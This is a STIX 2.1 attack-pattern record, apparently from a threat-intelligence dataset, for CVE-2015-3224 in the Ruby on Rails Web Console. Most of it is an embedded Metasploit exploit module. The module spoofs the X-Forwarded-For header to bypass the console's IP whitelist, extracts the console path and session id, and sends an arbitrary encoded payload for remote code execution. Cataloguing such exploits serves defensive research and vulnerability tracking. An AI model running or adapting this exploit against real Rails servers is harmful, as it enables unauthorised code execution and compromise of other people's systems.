{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4569ffa-ca4d-4b84-b209-8a9cbfc527e2",
    "created": "2024-08-14T17:07:37.435505Z",
    "modified": "2024-08-14T17:07:37.435509Z",
    "name": "Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution",
    "description": " This module exploits an IP whitelist bypass vulnerability in the developer web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also achieve code execution on Rails 4.2.x if the attack is launched from a whitelisted IP range. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_web_console_v2_code_exec.rb",
            "external_id": "rails_web_console_v2_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3224"
        },
        {
            "source_name": "reference",
            "url": "http://openwall.com/lists/oss-security/2015/06/16/18"
        },
        {
            "source_name": "reference",
            "url": "https://groups.google.com/forum/message/raw?msg=rubyonrails-security/lzmz9_ijUFw/HBMPi4zp5NAJ"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/44513"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution',\n      'Description'    => %q{\n          This module exploits an IP whitelist bypass vulnerability in the developer\n        web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also\n        achieve code execution on Rails 4.2.x if the attack is launched from a\n        whitelisted IP range.\n      },\n      'Author'         => [\n        'joernchen <joernchen[at]phenoelit.de>', # Discovery & disclosure\n        'Ben Murphy <benmmurphy@gmail.com>',     # Discovery & disclosure\n        'hdm'                                    # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2015-3224' ],\n          [ 'URL', 'http://openwall.com/lists/oss-security/2015/06/16/18' ],\n          [ 'URL', 'https://groups.google.com/forum/message/raw?msg=rubyonrails-security/lzmz9_ijUFw/HBMPi4zp5NAJ' ],\n          [ 'URL', 'https://hackerone.com/reports/44513' ]\n        ],\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        => [ ['Automatic', {} ] ],\n      'DefaultOptions' => { 'PrependFork' => true },\n      'DisclosureDate' => '2015-06-16',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(3000),\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', '/missing404' ])\n      ])\n  end\n\n  #\n  # Identify the web console path and session ID, then inject code with it\n  #\n  def exploit\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path),\n      'method'  => 'GET',\n      'headers' => {\n        'X-Forwarded-For' => '0000::1'\n      }\n    }, 25)\n\n    unless res\n      print_error(\"Error: No response requesting #{datastore['TARGETURI']}\")\n      return\n    end\n\n    web_console_path = nil\n\n    # Support vulnerable Web Console versions\n    if res.body.to_s =~ /data-remote-path='([^']+)'/\n      web_console_path = \"/\" + $1\n    end\n\n    # Support newer Web Console versions\n    if web_console_path.nil? && res.body.to_s =~ /data-mount-point='([^']+)'/\n      web_console_mount = $1\n      unless res.body.to_s =~ /data-session-id='([^']+)'/\n        print_error(\"Error: No session id found requesting #{datastore['TARGETURI']}\")\n        return\n      end\n      web_console_path = normalize_uri(web_console_mount, 'repl_sessions', $1)\n    end\n\n    unless web_console_path\n      if res.body.to_s.index('Application Trace') && res.body.to_s.index('Toggle session dump')\n        print_error('Error: The web console is patched, disabled, or you are not in the whitelisted scope')\n      else\n        print_error(\"Error: No web console path found when requesting #{datastore['TARGETURI']}\")\n      end\n      return\n    end\n\n    print_status(\"Sending payload to #{web_console_path}\")\n    res = send_request_cgi({\n      'uri'       => web_console_path,\n      'method'    => 'PUT',\n      'headers'   => {\n        'X-Forwarded-For'  => '0000::1',\n        'Accept'           => 'application/vnd.web-console.v2',\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'vars_post' => {\n        'input' => payload.encoded\n      }\n    }, 25)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-16",
    "x_mitre_platforms": [
        "ruby'"
    ]
}